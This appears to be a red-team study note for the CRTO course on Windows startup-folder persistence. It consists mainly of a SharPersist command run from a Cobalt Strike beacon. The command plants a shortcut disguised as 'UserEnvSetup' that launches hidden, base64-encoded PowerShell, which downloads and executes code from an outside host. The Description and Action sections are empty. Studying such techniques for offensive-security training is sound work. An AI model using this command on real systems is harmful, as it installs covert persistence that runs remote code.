
Applications, files and shortcuts within a user's startup folder are launched automatically when they first log in. It's commonly used to bootstrap the user's home environment (set wallpapers, shortcut's etc).

### 🖊️ SharPersist

Adding powershell command as startup execution via sharPersist.exe:

```
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -f "UserEnvSetup" -m add
```

A file will be dropped named UserEnvSetup.lnk in this example.


## 📔 Description

- 

##  📗 Action to perform 

1. 


### Properties
---
📆 created   {{07-02-2024}} 14:23
🏷️ tags: #redteam #crto   
---

